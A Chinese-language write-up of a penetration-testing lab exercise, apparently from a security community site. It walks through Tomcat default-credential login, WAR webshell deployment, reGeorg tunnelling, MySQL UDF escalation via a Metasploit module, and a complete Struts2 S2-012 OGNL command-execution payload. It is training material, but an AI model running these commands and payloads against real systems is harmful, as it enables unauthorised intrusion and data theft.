---
title: 靶场攻略 | 记一次实验靶场练习笔记
url: https://www.secpulse.com/archives/198336.html
source: 安全脉搏
date: 2023-03-29
fetch_date: 2025-10-04T10:58:28.822222
---

# 靶场攻略 | 记一次实验靶场练习笔记

[![](https://www.secpulse.com/wp-content/themes/secpulse2017/img/logo-header.png)](https://www.secpulse.com "安全脉搏")

* [首页](https://www.secpulse.com/)
* [分类阅读](https://www.secpulse.com/archives/category/category)

  #### 脉搏文库

  - [内网渗透](https://www.secpulse.com/archives/category/articles/intranet-penetration)
  - |
  - [代码审计](https://www.secpulse.com/archives/category/articles/code-audit)
  - |
  - [安全文献](https://www.secpulse.com/archives/category/articles/sec-doc)
  - |
  - [Web安全](https://www.secpulse.com/archives/category/articles/web)
  - |
  - [移动安全](https://www.secpulse.com/archives/category/articles/mobile-security)
  - |
  - [系统安全](https://www.secpulse.com/archives/category/articles/system)
  - |
  - [工控安全](https://www.secpulse.com/archives/category/articles/industrial-safety)
  - |
  - [CTF](https://www.secpulse.com/archives/category/exclusive/ctf-writeup)
  - |
  - [IOT安全](https://www.secpulse.com/archives/category/iot-security)
  - |

#### 安全建设

+ [业务安全](https://www.secpulse.com/archives/category/construction/businesssecurity)
+ |
+ [安全管理](https://www.secpulse.com/archives/category/construction/securityissue)
+ |
+ [数据分析](https://www.secpulse.com/archives/category/construction/bigdata)
+ |

#### 其他

+ [资讯](https://www.secpulse.com/archives/category/news)
+ |
+ [漏洞](https://www.secpulse.com/archives/category/vul)
+ |
+ [工具](https://www.secpulse.com/archives/category/tools)
+ |
+ [人物志](https://www.secpulse.com/archives/category/people)
+ |
+ [区块链安全](https://www.secpulse.com/archives/category/exclusive/block_chain_security)
+ |
+ [安全招聘](https://www.secpulse.com/archives/category/hiring)
+ |

- [安全问答](https://www.secpulse.com/newpage/question_list)
- [金币商城](https://www.secpulse.com/shop?donotcachepage=c010349fd98847cb9d6e07d3cbc19288)
- [安全招聘](https://www.secpulse.com/archives/category/hiring)
- [活动日程](https://www.secpulse.com/newpage/activity)
- [live课程](https://www.secpulse.com/live)
- [企业服务](https://duoyinsu.com/service.html)
- [插件社区](https://x.secpulse.com/)

小程序

![脉搏小程序](https://www.secpulse.com/wp-content/themes/secpulse2017/img/wxchat.jpg)
[登录](https://www.secpulse.com/user_login)
|
[注册](https://www.secpulse.com/user-register)

# 靶场攻略 | 记一次实验靶场练习笔记

[脉搏文库](https://www.secpulse.com/archives/category/category/secdocs)

[贝塔安全实验室](https://www.secpulse.com/newpage/author?author_id=9525)
![]( https://www.secpulse.com/wp-content/themes/secpulse2017/img/renzheng0.png)

2023-03-28

8,674

前两天朋友分享了一个实验靶场，感觉环境还不错，于是对测试过程进行了详细记录，靶场中涉及知识点总结如下：

* War包制作
* regeorg内网代理工具的使用
* UDF漏洞利用
* Struts2-012漏洞利用
* Msfvenom模块的使用

本次实验靶场的网络拓扑结构如下图所示：

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-198336-1679985834.png)

获取web据点

首先访问朋友给定的web服务器端口，为tomcat应用的默认页面，如下图所示：

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-198336-1679985835.png)

如果刚开始没有思路的话，可以百度搜索一下Tomcat示例页面相关漏洞情况。访问目标manager后台目录，尝试tomcat默认口令tomcat/tomcat进行登录：

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-198336-1679985838.png)

登录成功之后，tomcat管理后台有个部署war包的功能，可以通过上传war包getshell，获取服务器权限。

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-198336-1679985839.png)

在攻击机kali中生成war包后门，可以用自己的木马，也可使用kali自带webshell，默认路径：/usr/share/laudanum/

```
jar cvf shell.war xx.jsp
```

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-198336-1679985840.png)

在WAR file to deploy 功能处上传并部署后门war包，单击选择文件，选择生成的war文件并确定，点击击deploy按钮就完成了上传。

验证是否上传成功，浏览器访问注意事项：根目录+war包文件名+jsp webshell文件名

比如我上传了的war包名为cmd.war，木马名为：cmd.jsp

在浏览器地址栏中：hxxp://x.x.x.x/cmd/cmd.jsp

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-198336-1679985841.png)

接下是连接上传的jsp一句话，使用C刀连接目标服务器的jsp木马

下载地址：https://github.com/Chora10/Cknife  可自行编译或者下载网上的程序虚拟机里执行。

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-198336-1679985842.png)

菜刀成功连接后，会以树状形式显示webshell文件所处位置，如下图所示

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-198336-1679985843.png)

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-198336-16799858431.png)

添加代理

拿下web边界机以后，一般情况下，分两种情况：

* 有内网：以此为跳板，攻击内网其他机器，摸清目标内网拓扑环境，拿下靶标系统；
* 无内网：如果是项目，就可以收工了，不是的话，就可以作为代理池的一部分；

下面的情况属于有内网的环境，查看本机IP地址，发现两个网卡都有内网地址。

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-198336-1679985844.png)

目标web服务器并无探测主机存活的工具，两种方式：

* 自己上传端口扫描工具||脚本
* 使用隧道代理工具，代理自己的工具进入目标内网中，做初步的信息搜集。

此处选择第二种方式，上传regeorg程序的tunnel.jsp脚本到目标服务器的shell目录下

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-198336-16799858441.png)

web访问返回连接成功的信息(Georg says,’All seems fine’)   如下图所示，此为该工具流量硬特征，建议在下载后修改该字符串，或者使用升级版的neo-regeorg

https://github.com/L-codes/Neo-reGeorg      去特征且传输加密

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-198336-1679985845.png)

使用regeorg工具建立隧道，命令如下：

```
Python regeorgsocksproxy.py -u   hxxp://x.x.x.x/tunnel.jsp -p xxxx
```

-u 代理木马链接；

-p指定传输端口；

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-198336-1679985846.png)

在proxychains工具配置文件下添加regeorg打通的代理端口

vim /etc/proxychains.conf        在最后一行添加regeorg的配置好的传输端口即可

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-198336-1679985847.png)

代理nmap到内网扫描172网段敏感端口，使用TCP全连接扫描

一些Nmap使用语法：http://mang0.me/archis/40a439a4/

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-198336-1679985848.png)

UDF漏洞利用

通过扫描得到的MySQL应用信息，尝试弱口令连接，一样的思路哪个应用不会搜索哪里

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-198336-1679985853.png)

查看security\_file\_priv是否配置命令:

show variables like '%secure%';

显示结果对应解释

```
Secure_file_priv=null               //不允许导入导出文件
Secure_file_priv='D:/'  //允许导入到指定目录
Secure_file_priv=‘’               //允许到任意目录
Secure_file_priv=”/”              //允许到根目录
```

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-198336-1679985858.png)

发现为空可以写任意目录，使用proxychains将msf代理到目标内网中，利用MySQL的UDF漏洞进行命令执行。

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-198336-1679985861.png)

如果忘记模块，可以先search 需要的模块内容关键字

```
Use exploit/multi/mysql/mysql_udf_payload
```

查看未设置的参数   show  options

Password和rhost参数可以设置

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-198336-1679985867.png)

```
Set rhost 172.16.15.16
Set password 123456
run
```

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-198336-1679985871.png)

虽然显示没有会话，但是so文件已经传上去了，使用默认的MySQL命令连接，执行自定义函数，成功执行，说明udf提权成功。

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-198336-1679985876.png)

S2-012漏洞利用

代理nmap到内网扫描10网段机器敏感端口

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-198336-1679985881.png)

发现10.10.60.250:8080存在struts2-012漏洞

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-198336-1679985886.png)

Struts2-012 payload 测试

```
%{ #a=(new java.lang.ProcessBuilder(new java.lang.String[]{"ls","-al"})).redirectErrorStream(true).start(), #b=#a.getInputStream(), #c=new java.io.InputStreamReader(#b), #d=new java.io.BufferedReader(#c), #e=new char[50000], #d.read(#e), #f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"), #f.getWriter().println(new java.lang.String(#e)), #f.getWriter().flush(),#f.getWriter().close() }
```

成功读取/etc/passwd文件

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-198336-1679985887.png)

10.10.60.66和172.16.15.16一样的思路。

![](https://secpulse...